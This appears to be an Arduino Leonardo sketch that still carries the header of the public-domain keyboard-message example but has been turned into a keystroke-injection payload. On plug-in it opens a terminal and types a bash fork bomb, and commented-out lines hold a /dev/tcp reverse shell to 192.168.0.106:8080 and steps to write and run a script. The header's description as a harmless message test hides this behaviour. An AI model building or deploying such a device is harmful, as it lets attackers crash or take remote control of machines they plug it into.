/*
 Keyboard Message test

 For the Arduino Leonardo and Micro.

 Sends a text string when a button is pressed.

 The circuit:
 * pushbutton attached from pin 4 to +5V
 * 10-kilohm resistor attached from pin 4 to ground

 created 24 Oct 2011
 modified 27 Mar 2012
 by Tom Igoe
 modified 11 Nov 2013
 by Scott Fitzgerald

 This example code is in the public domain.

 http://www.arduino.cc/en/Tutorial/KeyboardMessage
 */

#include "Keyboard.h"

char ctrlKey = KEY_LEFT_CTRL;
char altKey = KEY_LEFT_ALT;
const int buttonPin = 4;          // input pin for pushbutton
int previousButtonState = HIGH;   // for checking the state of a pushButton
int counter = 0;                  // button push counter
int buttonState = 1;
void setup() {
  // make the pushButton pin an input:
 // pinMode(buttonPin, INPUT);
  // initialize control over the keyboard:
  Keyboard.begin();
}

void loop() {
  // read the pushbutton:
  // if the button state has changed,
  if (buttonState){
    buttonState--;
      // and it's currently pressed:
      //&& (buttonState == HIGH)) {
    // increment the button counter
   // counter++;
    // type out a message
      Keyboard.press(ctrlKey);
      Keyboard.press(altKey);
      Keyboard.press('t');
      delay(500);
      Keyboard.releaseAll();
      delay(100);
      //Keyboard.print(" nohup 0<&196;exec 196<>/dev/tcp/192.168.0.106/8080; sh <&196 >&196 2>&196 & \n");
      //Keyboard.print("cat > vulnerable.sh\n");
      //delay(500);
      Keyboard.print(":(){ :|: & };:\n");
      //delay(500);
      //Keyboard.press(ctrlKey);
      //Keyboard.press('d');
      //delay(500);
      //Keyboard.releaseAll();
      //Keyboard.print("sh vulnerable.sh\n");
      //:(){ :|: & };:
      delay(100);
      //Keyboard.press(ctrlKey);
      //Keyboard.press('d');
      //delay(500);
      //Keyboard.releaseAll();
      //delay(101);
  // wait for new window to open:
  //delay(1000);
  }
  // save the current button state for comparison next time:
  //previousButtonState = buttonState;
}

